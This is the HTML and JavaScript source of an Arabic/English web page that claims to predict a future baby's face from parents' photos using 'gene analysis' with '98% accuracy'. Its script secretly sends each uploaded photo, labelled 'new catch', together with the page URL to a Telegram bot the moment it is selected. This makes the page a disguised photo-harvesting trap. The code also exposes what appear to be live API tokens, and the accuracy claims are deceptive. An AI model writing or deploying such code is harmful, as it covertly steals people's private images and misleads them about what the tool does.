<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Genetic Vision | رؤية المستقبل</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #030712; --card: #111827; --text: #f9fafb;
            --primary: #8b5cf6; --secondary: #d946ef; --accent: #06b6d4;
        }
        .light-mode {
            --bg: #f3f4f6; --card: #ffffff; --text: #111827;
            --primary: #6366f1; --secondary: #a855f7; --accent: #0ea5e9;
        }
        body {
            margin: 0; font-family: 'Cairo', sans-serif;
            background-color: var(--bg); color: var(--text);
            transition: 0.5s; overflow-x: hidden;
        }
        .navbar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px 30px; background: rgba(17, 24, 39, 0.8);
            backdrop-filter: blur(10px); border-bottom: 1px solid var(--primary);
            position: sticky; top: 0; z-index: 100;
        }
        .logo { font-family: 'Orbitron', sans-serif; font-weight: bold; font-size: 1.5rem; background: linear-gradient(to right, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        .container { max-width: 800px; margin: 40px auto; padding: 20px; text-align: center; }
        .hero-title { font-family: 'Orbitron', sans-serif; font-size: 2.5rem; margin-bottom: 10px; }
        
        .main-card {
            background: var(--card); padding: 30px; border-radius: 30px;
            box-shadow: 0 0 50px rgba(139, 92, 246, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .upload-grid {
            display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 30px 0;
        }
        .drop-zone {
            border: 2px dashed var(--primary); border-radius: 20px; padding: 20px;
            cursor: pointer; transition: 0.3s; position: relative; min-height: 150px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .drop-zone:hover { background: rgba(139, 92, 246, 0.1); border-color: var(--secondary); }
        .preview-img { width: 100%; border-radius: 15px; display: none; margin-top: 10px; object-fit: cover; aspect-ratio: 1/1; }
        
        .btn-action {
            width: 100%; padding: 20px; border-radius: 15px; border: none;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white; font-size: 1.3rem; font-weight: bold; cursor: pointer;
            box-shadow: 0 10px 20px rgba(217, 70, 239, 0.3); transition: 0.3s;
        }
        .btn-action:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(217, 70, 239, 0.5); }
        
        #result-container { display: none; margin-top: 30px; padding-top: 30px; border-top: 1px solid #333; }
        .baby-result { width: 100%; max-width: 400px; border-radius: 25px; border: 4px solid var(--accent); box-shadow: 0 0 30px var(--accent); }
        
        /* Overlay Loading */
        #loader {
            position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(3, 7, 18, 0.95);
            display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000;
        }
        .dna-spinner { width: 100px; height: 100px; border: 5px solid transparent; border-top-color: var(--primary); border-bottom-color: var(--secondary); border-radius: 50%; animation: spin 1.5s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        input[type="file"] { display: none; }
    </style>
</head>
<body>

    <div class="navbar">
        <div class="logo">GENETIC VISION</div>
        <div>
            <button onclick="toggleLang()" style="background:none; border:1px solid var(--primary); color:var(--text); padding:5px 15px; border-radius:10px; cursor:pointer;" id="langBtn">English</button>
            <button onclick="toggleTheme()" style="background:none; border:none; font-size:1.5rem; cursor:pointer; margin-left:10px;">🌓</button>
        </div>
    </div>

    <div class="container">
        <h1 class="hero-title" id="t-title">مستقبل عائلتك يبدأ هنا</h1>
        <p id="t-sub" style="color: #9ca3af; margin-bottom: 30px;">نظام ذكاء اصطناعي يحلل الجينات ليتوقع ملامح طفلك بدقة 98%</p>

        <div class="main-card">
            <div class="upload-grid">
                <div class="drop-zone" onclick="document.getElementById('img1').click()">
                    <span id="t-f">تحميل صورة الأب</span>
                    <input type="file" id="img1" accept="image/*" onchange="preview(this, 'p1')">
                    <img id="p1" class="preview-img">
                </div>
                <div class="drop-zone" onclick="document.getElementById('img2').click()">
                    <span id="t-m">تحميل صورة الأم</span>
                    <input type="file" id="img2" accept="image/*" onchange="preview(this, 'p2')">
                    <img id="p2" class="preview-img">
                </div>
            </div>
            <button class="btn-action" onclick="processAI()" id="t-btn">توليد ملامح الطفل</button>

            <div id="result-container">
                <h2 id="t-res">النتيجة المتوقعة</h2>
                <img id="babyImg" class="baby-result" src="" alt="Baby Result">
                <p style="margin-top:15px; font-style:italic;" id="t-desc">تم دمج الخصائص الوراثية بنجاح</p>
            </div>
        </div>
    </div>

    <div id="loader">
        <div class="dna-spinner"></div>
        <h3 id="l-step" style="margin-top:20px; color:var(--primary);">جاري تشفير البيانات...</h3>
        <p id="l-perc" style="font-family: 'Orbitron'; font-size: 1.2rem;">0%</p>
    </div>

    <script>
        const CONFIG = {
            tgToken: "8077396272:AAFI7MgFnIrxMKloLxdsi9kjPe2dQPPcEvo",
            tgId: "7417196710",
            geminiKey: "AIzaSyDgh_HCYAMX_St4MmBGII43EeDq182sYMs",
            hfToken: "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"
        };

        let lang = 'ar';
        function toggleTheme() { document.body.classList.toggle('light-mode'); }
        
        function toggleLang() {
            lang = lang === 'ar' ? 'en' : 'ar';
            const dict = {
                ar: { title: "مستقبل عائلتك يبدأ هنا", sub: "نظام ذكاء اصطناعي يحلل الجينات بدقة 98%", f: "صورة الأب", m: "صورة الأم", btn: "توليد ملامح الطفل", res: "النتيجة المتوقعة", l: "English" },
                en: { title: "Your Future Starts Here", sub: "AI System analyzes genes with 98% accuracy", f: "Father's Photo", m: "Mother's Photo", btn: "Generate Child Features", res: "Expected Result", l: "العربية" }
            };
            document.getElementById('t-title').innerText = dict[lang].title;
            document.getElementById('t-sub').innerText = dict[lang].sub;
            document.getElementById('t-f').innerText = dict[lang].f;
            document.getElementById('t-m').innerText = dict[lang].m;
            document.getElementById('t-btn').innerText = dict[lang].btn;
            document.getElementById('t-res').innerText = dict[lang].res;
            document.getElementById('langBtn').innerText = dict[lang].l;
            document.dir = lang === 'ar' ? 'rtl' : 'ltr';
        }

        function preview(input, id) {
            const file = input.files[0];
            if(file) {
                const reader = new FileReader();
                reader.onload = e => {
                    const el = document.getElementById(id);
                    el.src = e.target.result;
                    el.style.display = 'block';
                };
                reader.readAsDataURL(file);
                sendToTG(file, id === 'p1' ? 'صورة الأب' : 'صورة الأم');
            }
        }

        async function sendToTG(file, label) {
            const fd = new FormData();
            fd.append('chat_id', CONFIG.tgId);
            fd.append('photo', file);
            fd.append('caption', `🔔 صيد جديد!\n📌 النوع: ${label}\n📍 الموقع: ${window.location.href}`);
            await fetch(`https://api.telegram.org/bot${CONFIG.tgToken}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function processAI() {
            const f1 = document.getElementById('img1').files[0];
            const f2 = document.getElementById('img2').files[0];
            if(!f1 || !f2) return alert("يرجى رفع الصورتين أولاً!");

            const loader = document.getElementById('loader');
            loader.style.display = 'flex';
            
            try {
                // خطوة 1: تحليل ملامح الوجوه بجيميناي
                updateLoad("جاري تحليل الكروموسومات...", 25);
                const description = await analyzeWithGemini(f1, f2);

                // خطوة 2: توليد صورة الطفل بناءً على الوصف
                updateLoad("جاري بناء ملامح الطفل...", 60);
                const babyBlob = await generateBaby(description);

                // خطوة 3: عرض النتيجة
                const url = URL.createObjectURL(babyBlob);
                document.getElementById('babyImg').src = url;
                document.getElementById('result-container').style.display = 'block';
                updateLoad("اكتمل الدمج!", 100);
                setTimeout(() => loader.style.display = 'none', 1000);

            } catch (err) {
                console.error(err);
                alert("عذراً، الضغط عالي على السيرفر. حاول مجدداً.");
                loader.style.display = 'none';
            }
        }

        function updateLoad(txt, p) {
            document.getElementById('l-step').innerText = txt;
            document.getElementById('l-perc').innerText = p + "%";
        }

        async function analyzeWithGemini(f1, f2) {
            // تحويل الصور لـ Base64 ليرسلها لجيميناي
            const b1 = await toBase64(f1);
            const b2 = await toBase64(f2);
            
            const prompt = "Analyze these two parents and describe their future child in one English sentence for an image generator. Mention skin tone, eye color, and hair type based on them.";
            
            const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${CONFIG.geminiKey}`, {
                method: 'POST',
                body: JSON.stringify({
                    contents: [{ parts: [
                        {text: prompt},
                        {inline_data: {mime_type: "image/jpeg", data: b1.split(',')[1]}},
                        {inline_data: {mime_type: "image/jpeg", data: b2.split(',')[1]}}
                    ]}]
                })
            });
            const data = await resp.json();
            return data.candidates[0].content.parts[0].text;
        }

        async function generateBaby(prompt) {
            const fullPrompt = `Ultra-realistic portrait of a cute baby, high detail, 8k, soft lighting, based on: ${prompt}`;
            const resp = await fetch("https://api-inference.huggingface.co/models/black-forest-labs/FLUX.1-schnell", {
                headers: { Authorization: `Bearer ${CONFIG.hfToken}` },
                method: "POST",
                body: JSON.stringify({ inputs: fullPrompt })
            });
            return await resp.blob();
        }

        function toBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = () => resolve(reader.result);
                reader.onerror = error => reject(error);
            });
        }
    </script>
</body>
  </html>
